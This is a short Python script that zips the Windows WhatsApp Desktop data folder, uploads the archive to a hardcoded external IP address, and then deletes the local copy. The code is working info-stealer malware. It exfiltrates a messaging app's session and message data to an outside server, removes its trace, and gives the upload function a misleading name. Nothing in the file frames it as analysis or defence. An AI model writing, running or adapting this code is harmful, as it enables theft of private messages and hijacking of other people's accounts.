import os
import requests
import time
import socket
import shutil

UPLOAD_URL = "http://47.236.178.137/upload.php"
direct = f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm"
print(direct)

def upload_to_local_server(path):
    for _ in range(10):
        try:
            response = requests.post(
                UPLOAD_URL,
                files={"file": open(path, "rb")}
            )
            return response.status_code == 200
        except Exception:
            time.sleep(2)
    return False

try:
    shutil.make_archive("ssouput", "zip", direct)
except Exception: 
    pass

if upload_to_local_server(f"{os.getcwd()}\\ssouput.zip"):
    print("Upload successful")
else:
    print("Upload failed")

os.remove(f"{os.getcwd()}\\ssouput.zip")